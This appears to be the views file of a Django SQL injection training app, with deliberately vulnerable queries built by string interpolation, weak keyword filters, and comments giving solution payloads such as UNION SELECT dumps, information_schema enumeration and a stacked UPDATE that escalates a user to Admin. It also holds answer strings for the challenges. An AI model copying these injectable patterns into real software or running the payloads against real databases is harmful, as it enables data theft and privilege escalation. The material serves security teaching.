from django.shortcuts import render

# Create your views here.
import logging
import os
import sys

from django.shortcuts import render, redirect
from django.db import connections, ProgrammingError

# Create your views here.
from .models import CheckProblems
from .models import *
from collections import namedtuple
from django.contrib.auth.decorators import login_required
from users.models import UsersProblems, SqlProblem

# TODO put each problem his answer here

answers = ["something", "this is_the_answer", "second answer", "3answer", "4answer", "5answer", "6answer"]
problems_names = ["no problem", "Problem1", "Problem2", "Problem3", "Problem4", "Problem5", "Problem6"]
global_logger = logging.getLogger(__name__)


def fill_employee_database():
    employees = [
        Employee(1, "Ariel", "Vainshtein", 26),
        Employee(2, "Joshua", "Graham", 30),
        Employee(3, "Abraham", "Yalkovitch", 28),

    ]
    for data in employees:
        data.save(using="problems_db")


def fill_clothing_store_db():
    items = [
        ClothingStore(803654786, ClothingItem.SHOES.value, "Nike", 25.23),
        ClothingStore(987124123, ClothingItem.SHIRTS.value, "H&O", 22.10),
        ClothingStore(300125487, ClothingItem.PANTS.value, "Diadora", 33.99),
        ClothingStore(159845362, ClothingItem.SUITS.value, "Diadora", 99.99),
        ClothingStore(198742178, ClothingItem.TROUSERS.value, "Diadora", 19.99),
    ]
    for data in items:
        data.save(using="problems_db")


def fill_vehicle_db():
    items = [
        Vehicle('111-22-333', 4, 'Toyota', 0, 10564.23, True),
        Vehicle('165-81-713', 4, 'BMW', 1, 9846.89, False),
    ]
    for data in items:
        data.save(using="problems_db")


def init_secret_db():
    item = BlindSecret(1, 'Bingo')
    item.save(using="problems_db")


def check_answer_input(real_answer, user_answer):
    logger = logging.getLogger(__name__)
    logger.error(" problem_login view called ")
    if real_answer == user_answer:
        logger.error(" Good job the answer is good ")
        return True
    else:
        return False


def init_safe_db():
    prize_amount = 10000000
    safe = Safe(1, '4-8-15-23-48', prize_amount)
    safe.save(using="problems_db")
    return prize_amount


def init_mockup_user_db(user):
    items = [

        User(user.id + 1, 'yxiltih', 'notsu@gmail.com', '901a706ec09c2466e450e5ccda37c5', UserRole.ADMIN.value),
        User(user.id, user.username, user.email, user.password, UserRole.USER.value)

    ]
    for item in items:
        item.save(using="problems_db")


def update_answer_for_user(user, problem_name):
    global_logger.error("update_answer_for_user called")
    print(user)
    print(problem_name)
    problem = SqlProblem.objects.get(name=problem_name)
    UsersProblems(user=user.profile, problem=problem).save()


'''
    solution: 1 UNION SELECT * from db_employees
'''


@login_required
def first_problem(request):
    fill_employee_database()
    context = {
        'num_items': len(Employee.objects.using('problems_db').all())
    }

    cursor = connections['problems_db'].cursor()

    if request.method == 'POST':
        input_id_request = request.POST.get("input_id")
        user_answer = request.POST.get("problem_answer")
        is_answer = check_answer_input(answers[1], str(user_answer))
        if is_answer:
            update_answer_for_user(request.user, problem_name=problems_names[1])

        if input_id_request is not None and input_id_request != "":
            sql = f"SELECT * FROM db_employees WHERE id = {input_id_request};"
            try:
                cursor.execute(sql)
                result = cursor.fetchall()
                context['result'] = result
                context['num_resulted_items'] = len(result)
                cursor.close()
            except Exception as e:
                context['error'] = e
    return render(request, 'problems/1.html', context)


'''
    Solution:
    First Name: a
    Last Name:: b'; select * from db_employees where '1' = '1' --#
'''


@login_required
def second_problem(request):
    fill_employee_database()
    key_words = ['%', 'union', 'and', 'or']
    cursor = connections['problems_db'].cursor()

    context = {'num_items': len(Employee.objects.using('problems_db').all())}

    if request.method == 'POST':
        first_name_request = request.POST.get("first_name")
        last_name_request = request.POST.get("last_name")
        for kw in key_words:
            if kw in first_name_request or kw in last_name_request:
                first_name_request = "null"
                break
        user_answer = request.POST.get("problem_answer")
        is_answer = check_answer_input(answers[2], str(user_answer))
        if is_answer:
            update_answer_for_user(request.user, problem_name=problems_names[2])
        sql = f"SELECT id, first_name, last_name FROM db_employees WHERE first_name LIKE '{first_name_request}' and last_name LIKE '{last_name_request}'"
        try:
            cursor.execute(sql)
            result = cursor.fetchall()
            cursor.close()
            context['result'] = result
            context['num_resulted_items'] = len(result)
        except Exception as e:
            context['error'] = e
    return render(request, 'problems/2.html', context)


'''
   Solution:
   Step #1: try to get error message that reveals db name
   Step #2: 1 union select * from db_clothing_shop
'''


@login_required
def third_problem(request):
    fill_clothing_store_db()
    key_words = ['or', 'and', '#', 'join', ';']
    context = {
        'num_items': len(ClothingStore.objects.using('problems_db').all()),
    }
    cursor = connections['problems_db'].cursor()

    if request.method == 'POST':
        item_name_request = request.POST.get("item_name").lower()
        for kw in key_words:
            if kw in item_name_request:
                item_name_request = "1"
                break
        sql = f"SELECT * FROM db_clothing_shop WHERE barcode = {item_name_request}"
        try:
            cursor.execute(sql)
        except Exception as e:
            sql = f"SELECT * FROM db_clothing_shop WHERE item_name LIKE 'a'"
            cursor.execute(sql)
            context['error'] = e
        result = cursor.fetchall()
        cursor.close()
        context['result'] = result
        context['num_resulted_items'] = len(result)
    return render(request, 'problems/3.html', context)


@login_required
def forth_problem(request):
    fill_vehicle_db()
    global_logger.error(" forth_problem view called ")
    context = {'message': "Out of stock"}

    cursor = connections['problems_db'].cursor()
    if request.method == 'POST':
        manufacturer_request = request.POST.get("input_manufacturer")
        user_answer = request.POST.get("problem_answer")
        is_answer = check_answer_input(answers[4], str(user_answer))
        if is_answer:
            update_answer_for_user(request.user, problem_name=problems_names[4])
        sql = f"SELECT * FROM db_vehicles WHERE lower(manufacturer) LIKE '{manufacturer_request}'"
        try:
            cursor.execute(sql)
            result = cursor.fetchall()
            if result is not None and len(result) != 0:
                context['message'] = "Exists in storage"
            cursor.close()
        except:
            context['message'] = 'Invalid Input'

    return render(request, 'problems/4.html', context)


@login_required
def fifth_problem(request):
    fill_clothing_store_db()
    cursor = connections['problems_db'].cursor()

    context = {
        'items': ClothingItem.get_values(),
        'num_items': len(ClothingStore.objects.using('problems_db').all()),
    }

    if request.method == 'POST':
        item_name_request = request.POST.get("item_select")
        sql = f"SELECT * FROM db_clothing_shop WHERE item_name LIKE '{item_name_request}'"
        cursor.execute(sql)
        result = cursor.fetchall()
        cursor.close()
        context['result'] = result
        context['num_items'] = len(result)

    return render(request, 'problems/5.html', context)


@login_required
def sixth_problem(request):
    init_secret_db()

    context = {
        'secret_value': BlindSecret.objects.using("problems_db").filter(id=1)[0].secret
    }

    cursor2 = connections['problems_db'].cursor()
    if request.method == 'POST':
        first_name_request = request.POST.get("input_first_name")
        with cursor2 as cursor:
            sql = f"SELECT * FROM db_employees WHERE first_name LIKE '{first_name_request}';"
            cursor.execute(sql)
            result = cursor.fetchall()
            context['result'] = result
            if result is not None and len(result) != 0:
                context['message'] = "There's Employee With This Name"
            else:
                context['message'] = "No Employee With This Name"
            cursor.close()
    return render(request, 'problems/6.html', context)


@login_required
def seventh_problem(request):
    return render(request, 'problems/7.html')


'''
    Note: Trying to get an error message gets the table name.
    Trying to access the table with will result in special 'no access message'

    Step #1: a'; SELECT table_schema,table_name 
               FROM information_schema.tables 
               WHERE table_schema LIKE 'public' 
               ORDER BY table_schema, table_name--#
    Need to find the table where user data is store - db_users

    Step #2: a'; select * from db_users --# 
    To get all rows -> will se admin, manager and user roles

    Step #2.5: In case user doesn't guess or finds out the column 'role'
    it's possible to get it by the following command:
    1'; select * from information_schema.columns where table_name='db_users' --#

    Step #3: Update user privileges, then try to access the secret_safe
    a'; UPDATE db_users SET role = 'Admin' WHERE db_users.id = 1; select * from db_users; select prize from secret_safe where 1=1 --#
'''


@login_required
def eighth_problem(request):
    prize_amount = init_safe_db()
    init_mockup_user_db(request.user)
    cursor = connections['problems_db'].cursor()
    context = {'secret': Safe.objects.using("problems_db").get(id=1).prize}

    if request.method == 'POST':
        secret_pass_request = request.POST.get('secret_password')
        sql = f"SELECT prize FROM secret_safe WHERE secret_pass LIKE '{secret_pass_request}'"
        try:
            cursor.execute(sql)
            result = cursor.fetchall()
            context['result'] = result
        except Exception as e:
            context['result'] = []
            context['error'] = e
        cursor.close()
        per_flag, permission = False, True
        if 'secret_safe' in secret_pass_request:
            per_flag = True
        for itr in context['result']:
 #           print(itr)
            if itr[0] == prize_amount:
                per_flag = True
                break
        if per_flag:
#            print('jere')
            permission = User.objects.using("problems_db").get(pk=request.user.id).role == 'Admin'
            context['result'] = [] if permission is False else context['result']
            context['error'] = "You Don't Have Permission To View This Data" if permission is False else None
            context['secret_result'] = None if permission is False else prize_amount
    return render(request, 'problems/8.html', context)


@login_required
def ninth_problem(request):
    context = {}
    return render(request, 'problems/9.html', context)